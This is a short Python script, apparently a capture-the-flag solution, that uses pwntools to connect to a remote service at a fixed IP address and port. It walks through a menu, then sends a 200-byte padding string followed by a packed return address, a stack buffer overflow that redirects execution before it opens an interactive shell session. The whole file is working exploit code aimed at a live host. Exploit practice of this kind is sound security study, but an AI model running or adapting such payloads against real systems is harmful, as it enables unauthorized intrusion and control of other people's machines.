#!/usr/bin/python

from pwn import *

context.arch = "i386"
r = remote("124.16.75.117", 51001)
r.sendline(b"jiuhao")
r.recvuntil(b"choice:>>")
r.sendline(b"1")
r.recvuntil(b"we in addr")
r.sendline(b"a" * 200 + p32(0x08048644))
# r.sendline(b"aaa")
# r.sendline(b"2")

r.interactive()
